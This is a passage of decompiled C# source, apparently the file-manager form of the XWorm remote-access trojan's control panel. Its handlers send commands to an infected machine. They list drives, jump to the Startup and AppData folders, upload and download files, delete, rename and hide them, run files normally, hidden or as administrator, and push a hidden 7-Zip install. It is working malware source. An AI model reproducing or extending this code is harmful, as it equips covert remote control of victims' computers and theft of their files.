		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(0, 348);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.ReadOnly = true;
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(651, 21);
		this.Guna2TextBox1.TabIndex = 50;
		this.Guna2Panel1.Controls.Add(this.Label1);
		this.Guna2Panel1.Controls.Add(this.Guna2TextBox2);
		this.Guna2Panel1.Controls.Add(this.Guna2GradientButton4);
		this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel1.Location = new System.Drawing.Point(0, 0);
		this.Guna2Panel1.Name = "Guna2Panel1";
		this.Guna2Panel1.Size = new System.Drawing.Size(651, 32);
		this.Guna2Panel1.TabIndex = 51;
		this.Label1.AutoSize = true;
		this.Label1.Location = new System.Drawing.Point(99, 9);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(47, 13);
		this.Label1.TabIndex = 80;
		this.Label1.Text = "Search :";
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(152, 5);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderText = "...";
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(241, 21);
		this.Guna2TextBox2.TabIndex = 79;
		this.Guna2GradientButton4.BorderRadius = 3;
		this.Guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton4.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton4.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton4.Image");
		this.Guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton4.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton4.Location = new System.Drawing.Point(12, 5);
		this.Guna2GradientButton4.Name = "Guna2GradientButton4";
		this.Guna2GradientButton4.Size = new System.Drawing.Size(79, 21);
		this.Guna2GradientButton4.TabIndex = 78;
		this.Guna2GradientButton4.Text = "Back";
		this.Guna2GradientButton4.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(651, 391);
		base.Controls.Add(this.PictureBox1);
		base.Controls.Add(this.ListView1);
		base.Controls.Add(this.Guna2TextBox1);
		base.Controls.Add(this.StatusStrip1);
		base.Controls.Add(this.Guna2Panel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FM";
		this.Text = "File Manager";
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Guna2Panel1.ResumeLayout(false);
		this.Guna2Panel1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void FM_Load(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GetDrives");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
		ListView1.Controls.Add(PictureBox1);
		PictureBox1.Visible = false;
	}

	public void method_0(string searchText, System.Windows.Forms.ListView sourceListView, int subItemIndex = 0)
	{
		for (int i = sourceListView.Items.Count - 1; i >= 0; i--)
		{
			ListViewItem currentItem = sourceListView.Items[i];

			if (!currentItem.SubItems[subItemIndex].Text.ToLower().Contains(searchText.ToLower()))
			{
				sourceListView.Invoke((MethodInvoker)delegate
				{
					sourceListView.Items.Remove(currentItem);
					sourceListView.EndUpdate();
				});


				if (!listViewContainsItem(sourceListView, currentItem))
				{
					sourceListView.Invoke((MethodInvoker)delegate
					{
						sourceListView.BeginUpdate();
						sourceListView.Items.Add((ListViewItem)currentItem.Clone());
						sourceListView.EndUpdate();
					});
				}
			}
		}
	}

	bool listViewContainsItem(System.Windows.Forms.ListView listView, ListViewItem item)
	{
		return listView.Items.Cast<ListViewItem>().Any(existingItem => existingItem.Equals(item));
	}


	private void FM_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseFM");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void ListView1_DoubleClick(object sender, EventArgs e)
	{
		try
		{
			if ((ListView1.FocusedItem.ImageIndex == 0) | (ListView1.FocusedItem.ImageIndex == 1) | (ListView1.FocusedItem.ImageIndex == 3) | (ListView1.FocusedItem.ImageIndex == 4) | (ListView1.FocusedItem.ImageIndex == 2))
			{
				if (Guna2TextBox1.Text.Length == 0)
				{
					Guna2TextBox1.Text += ListView1.FocusedItem.Text;
				}
				else
				{
					Guna2TextBox guna2TextBox;
					(guna2TextBox = Guna2TextBox1).Text = guna2TextBox.Text + ListView1.FocusedItem.Text + "\\";
				}
				method_1();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1()
	{
		if (Operators.CompareString(Guna2TextBox1.Text, "", TextCompare: false) == 0)
		{
			byte[] array = Module0.smethod_6("GetDrives");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else
		{
			byte[] array2 = Module0.smethod_6("FileManager" + GClass19.string_0 + Guna2TextBox1.Text);
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array2);
		}
	}

	private void ListView1_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A && ListView1.Items.Count > 0)
			{
				foreach (ListViewItem item in ListView1.Items)
				{
					item.Selected = true;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			try
			{
				if ((ListView1.FocusedItem.ImageIndex == 0) | (ListView1.FocusedItem.ImageIndex == 1) | (ListView1.FocusedItem.ImageIndex == 3) | (ListView1.FocusedItem.ImageIndex == 4) | (ListView1.FocusedItem.ImageIndex == 2))
				{
					if (Guna2TextBox1.Text.Length == 0)
					{
						Guna2TextBox1.Text += ListView1.FocusedItem.Text;
					}
					else
					{
						Guna2TextBox guna2TextBox;
						(guna2TextBox = Guna2TextBox1).Text = guna2TextBox.Text + ListView1.FocusedItem.Text + "\\";
					}
					method_1();
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Debug.WriteLine(ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
		if (e.KeyCode != Keys.Back)
		{
			return;
		}
		e.SuppressKeyPress = true;
		try
		{
			if (Guna2TextBox1.Text.Length < 4)
			{
				Guna2TextBox1.Text = "";
				byte[] array = Module0.smethod_6("GetDrives" + GClass19.string_0);
				_Closure_0024__R261_002D8 arg = default(_Closure_0024__R261_002D8);
				_Closure_0024__R261_002D8 CS_0024_003C_003E8__locals0 = new _Closure_0024__R261_002D8(arg);
				CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
				}, array);
			}
			else
			{
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, Guna2TextBox1.Text.LastIndexOf("\\"));
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, checked(Guna2TextBox1.Text.LastIndexOf("\\") + 1));
				method_1();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Debug.WriteLine(ex3.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
	{
		PictureBox1.Image = null;
		PictureBox1.Visible = false;
		if (ListView1.SelectedItems.Count != 1)
		{
			return;
		}
		ListViewItem listViewItem = ListView1.SelectedItems[0];
		try
		{
			if (listViewItem.Text.ToLower().EndsWith(".mp4") | listViewItem.Text.ToLower().EndsWith(".avi") | listViewItem.Text.ToLower().EndsWith(".mkv") | listViewItem.Text.ToLower().EndsWith(".3gp") | listViewItem.Text.ToLower().EndsWith(".wmv") | listViewItem.Text.ToLower().EndsWith(".webm"))
			{
				byte[] array = Module0.smethod_6("viewvideo" + GClass19.string_0 + Guna2TextBox1.Text + listViewItem.Text);
				GClass5 gClass = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass.method_1((byte[])a0);
				}, array);
				PictureBox1.Visible = true;
				return;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (listViewItem.Text.ToLower().EndsWith(".jpg") | listViewItem.Text.ToLower().EndsWith(".png") | listViewItem.Text.ToLower().EndsWith(".jpeg") | listViewItem.Text.ToLower().EndsWith(".gif") | listViewItem.Text.ToLower().EndsWith(".bmp") | listViewItem.Text.ToLower().EndsWith(".ico") | listViewItem.Text.ToLower().EndsWith(".tiff"))
			{
				byte[] array2 = Module0.smethod_6("viewimage" + GClass19.string_0 + Guna2TextBox1.Text + listViewItem.Text + GClass19.string_0 + PictureBox1.Width + GClass19.string_0 + PictureBox1.Height);
				GClass5 gClass2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass2.method_1((byte[])a0);
				}, array2);
				PictureBox1.Visible = true;
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Debug.WriteLine(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FM_Resize(object sender, EventArgs e)
	{
		checked
		{
			PictureBox1.Left = ListView1.Width - PictureBox1.Width - 25;
			PictureBox1.Top = ListView1.Height - PictureBox1.Height - 25;
		}
	}

	private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
	{
		ToolStripStatusLabel1.Visible = false;
		ToolStripStatusLabel1.Text = null;
	}

	private void ListView1_DragEnter(object sender, DragEventArgs e)
	{
		if (e.Data.GetDataPresent(DataFormats.FileDrop))
		{
			e.Effect = DragDropEffects.Copy;
		}
	}

	private void ListView1_DragDrop(object sender, DragEventArgs e)
	{
		string[] array = (string[])(object)(string)e.Data.GetData(DataFormats.FileDrop);
		_Closure_0024__R267_002D14 closure_0024__R267_002D = default(_Closure_0024__R267_002D14);
		foreach (string path in array)
		{
			if (File.Exists(path))
			{
				byte[] array2 = Module0.smethod_6("sendfileto" + GClass19.string_0 + Guna2TextBox1.Text + Path.GetFileName(path) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(path))));
				ToolStripStatusLabel1.ForeColor = Color.Green;
				ToolStripStatusLabel1.Text = Path.GetFileName(path) + " Uploading..";
				ToolStripStatusLabel1.Visible = true;
				closure_0024__R267_002D = new _Closure_0024__R267_002D14(closure_0024__R267_002D);
				closure_0024__R267_002D._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R267_002D._Lambda_0024__R16, array2);
			}
		}
	}

	private void BackToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Guna2TextBox1.Text.Length < 4)
			{
				Guna2TextBox1.Text = "";
				byte[] array = Module0.smethod_6("GetDrives");
				GClass5 gClass = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass.method_1((byte[])a0);
				}, array);
			}
			else
			{
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, Guna2TextBox1.Text.LastIndexOf("\\"));
				Guna2TextBox1.Text = Guna2TextBox1.Text.Substring(0, checked(Guna2TextBox1.Text.LastIndexOf("\\") + 1));
				method_1();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		method_1();
	}

	private void DesktopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GOTO" + GClass19.string_0 + "Desktop");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void UserFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GOTO" + GClass19.string_0 + "User");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void TempToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GOTO" + GClass19.string_0 + "Temp");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void AppDataToolStripMenuItem_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GOTO" + GClass19.string_0 + "AppData");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void StartupToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("GOTO" + GClass19.string_0 + "Startup");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		string_1 = null;
		string_2 = null;
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			ref string reference = ref string_1;
			reference = reference + "-=>" + Guna2TextBox1.Text + selectedItem.Text;
			string_2 = "-=>";
		}
	}

	private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		string_1 = null;
		string_2 = null;
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			ref string reference = ref string_1;
			reference = reference + "-=>" + Guna2TextBox1.Text + selectedItem.Text;
			string_2 = "*";
		}
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_2, "-=>", TextCompare: false) == 0)
		{
			byte[] array = Module0.smethod_6("CPP" + GClass19.string_0 + string_1 + GClass19.string_0 + Guna2TextBox1.Text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			string_1 = null;
			string_2 = null;
		}
		if (Operators.CompareString(string_2, "*", TextCompare: false) == 0)
		{
			byte[] array2 = Module0.smethod_6("CTT" + GClass19.string_0 + string_1 + GClass19.string_0 + Guna2TextBox1.Text);
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array2);
			string_1 = null;
			string_2 = null;
		}
	}

	private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("tss" + GClass19.string_0 + Guna2TextBox1.Text + ListView1.FocusedItem.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void NormalToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R279_002D34 closure_0024__R279_002D = default(_Closure_0024__R279_002D34);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("Execute" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R279_002D = new _Closure_0024__R279_002D34(closure_0024__R279_002D);
			closure_0024__R279_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R279_002D._Lambda_0024__R36, array);
		}
	}

	private void HiddenToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R280_002D36 closure_0024__R280_002D = default(_Closure_0024__R280_002D36);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("ExecuteHide" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R280_002D = new _Closure_0024__R280_002D36(closure_0024__R280_002D);
			closure_0024__R280_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R280_002D._Lambda_0024__R38, array);
		}
	}

	private void RunAsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R281_002D38 closure_0024__R281_002D = default(_Closure_0024__R281_002D38);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("ExecuteRunAs" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R281_002D = new _Closure_0024__R281_002D38(closure_0024__R281_002D);
			closure_0024__R281_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R281_002D._Lambda_0024__R40, array);
		}
	}

	private void RenameToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R282_002D40 closure_0024__R282_002D = default(_Closure_0024__R282_002D40);
		_Closure_0024__R282_002D41 closure_0024__R282_002D2 = default(_Closure_0024__R282_002D41);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			int imageIndex = selectedItem.ImageIndex;
			if (imageIndex >= 0 && imageIndex <= 1)
			{
				continue;
			}
			if (imageIndex == 2)
			{
				string text = Interaction.InputBox("Enter New Folder Name", "Folder", selectedItem.Text);
				if ((Operators.CompareString(text, selectedItem.Text, TextCompare: false) == 0) | string.IsNullOrEmpty(text))
				{
					break;
				}
				byte[] array = Module0.smethod_6("Rename" + GClass19.string_0 + "Folder" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text + GClass19.string_0 + text);
				closure_0024__R282_002D = new _Closure_0024__R282_002D40(closure_0024__R282_002D);
				closure_0024__R282_002D._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R282_002D._Lambda_0024__R43, array);
			}
			else
			{
				string text2 = Interaction.InputBox("Enter New File Name", "File", selectedItem.Text);
				if ((Operators.CompareString(text2, selectedItem.Text, TextCompare: false) == 0) | string.IsNullOrEmpty(text2))
				{
					break;
				}
				byte[] array2 = Module0.smethod_6("Rename" + GClass19.string_0 + "File" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text + GClass19.string_0 + text2);
				closure_0024__R282_002D2 = new _Closure_0024__R282_002D41(closure_0024__R282_002D2);
				closure_0024__R282_002D2._0024VB_0024NonLocal_3 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R282_002D2._Lambda_0024__R44, array2);
			}
		}
	}

	private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R283_002D44 closure_0024__R283_002D = default(_Closure_0024__R283_002D44);
		_Closure_0024__R283_002D45 closure_0024__R283_002D2 = default(_Closure_0024__R283_002D45);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			int imageIndex = selectedItem.ImageIndex;
			if (imageIndex < 0 || imageIndex > 1)
			{
				if (imageIndex == 2)
				{
					byte[] array = Module0.smethod_6("Delete" + GClass19.string_0 + "Folder" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
					closure_0024__R283_002D = new _Closure_0024__R283_002D44(closure_0024__R283_002D);
					closure_0024__R283_002D._0024VB_0024NonLocal_2 = gclass5_0;
					ThreadPool.QueueUserWorkItem(closure_0024__R283_002D._Lambda_0024__R47, array);
				}
				else
				{
					byte[] array2 = Module0.smethod_6("Delete" + GClass19.string_0 + "File" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
					closure_0024__R283_002D2 = new _Closure_0024__R283_002D45(closure_0024__R283_002D2);
					closure_0024__R283_002D2._0024VB_0024NonLocal_3 = gclass5_0;
					ThreadPool.QueueUserWorkItem(closure_0024__R283_002D2._Lambda_0024__R48, array2);
				}
			}
		}
	}

	private void UploadToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog
		{
			Filter = "All files (*.*)|*.*",
			Multiselect = true
		};
		checked
		{
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string[] fileNames = openFileDialog.FileNames;
				int num = fileNames.Length - 1;
				_Closure_0024__R284_002D48 closure_0024__R284_002D = default(_Closure_0024__R284_002D48);
				for (int i = 0; i <= num; i++)
				{
					byte[] array = Module0.smethod_6("sendfileto" + GClass19.string_0 + Guna2TextBox1.Text + Path.GetFileName(fileNames[i]) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(fileNames[i]))));
					ToolStripStatusLabel1.ForeColor = Color.Green;
					ToolStripStatusLabel1.Text = Path.GetFileName(fileNames[i]) + " Uploading..";
					ToolStripStatusLabel1.Visible = true;
					closure_0024__R284_002D = new _Closure_0024__R284_002D48(closure_0024__R284_002D);
					closure_0024__R284_002D._0024VB_0024NonLocal_2 = gclass5_0;
					ThreadPool.QueueUserWorkItem(closure_0024__R284_002D._Lambda_0024__R50, array);
				}
			}
		}
	}

	private void DownloadToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R285_002D50 closure_0024__R285_002D = default(_Closure_0024__R285_002D50);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("downloadfile" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text + GClass19.string_0 + selectedItem.Text);
			closure_0024__R285_002D = new _Closure_0024__R285_002D50(closure_0024__R285_002D);
			closure_0024__R285_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R285_002D._Lambda_0024__R52, array);
		}
	}

	private void NewFolderToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter The folder's Name", "Creat New Folder");
		if (!string.IsNullOrEmpty(text))
		{
			byte[] array = Module0.smethod_6("creatnewfolder" + GClass19.string_0 + Guna2TextBox1.Text + text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void NewFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter The File Name", "Creat New File");
		if (!string.IsNullOrEmpty(text))
		{
			byte[] array = Module0.smethod_6("creatfile" + GClass19.string_0 + Guna2TextBox1.Text + text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void ShowFolderFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		_Closure_0024__R288_002D56 closure_0024__R288_002D = default(_Closure_0024__R288_002D56);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("showfolderfile" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R288_002D = new _Closure_0024__R288_002D56(closure_0024__R288_002D);
			closure_0024__R288_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R288_002D._Lambda_0024__R58, array);
		}
	}

	private void HideFolderFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		_Closure_0024__R289_002D58 closure_0024__R289_002D = default(_Closure_0024__R289_002D58);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("hidefolderfile" + GClass19.string_0 + Guna2TextBox1.Text + selectedItem.Text);
			closure_0024__R289_002D = new _Closure_0024__R289_002D58(closure_0024__R289_002D);
			closure_0024__R289_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R289_002D._Lambda_0024__R60, array);
		}
	}

	private void HiddenInstallationlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("7zIT" + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(XWorm_Resources._7z)) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(XWorm_Resources._7zD)));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ZipToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		string text = default(string);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			text = text + " -ir!\"" + Guna2TextBox1.Text + selectedItem.Text + "\" ";
		}
		byte[] array = Module0.smethod_6("7z" + GClass19.string_0 + " a -r \"" + Guna2TextBox1.Text + ListView1.FocusedItem.Text + ".zip\"" + text + " -y");
		_Closure_0024__R291_002D62 arg = default(_Closure_0024__R291_002D62);
		_Closure_0024__R291_002D62 CS_0024_003C_003E8__locals0 = new _Closure_0024__R291_002D62(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
		}, array);
	}

	private void UnzipToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R292_002D64 closure_0024__R292_002D = default(_Closure_0024__R292_002D64);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("7z" + GClass19.string_0 + " x \"" + Guna2TextBox1.Text + selectedItem.Text + "\" -o\"" + Guna2TextBox1.Text + selectedItem.Text.Replace(".zip", "") + "\" -y");
			closure_0024__R292_002D = new _Closure_0024__R292_002D64(closure_0024__R292_002D);
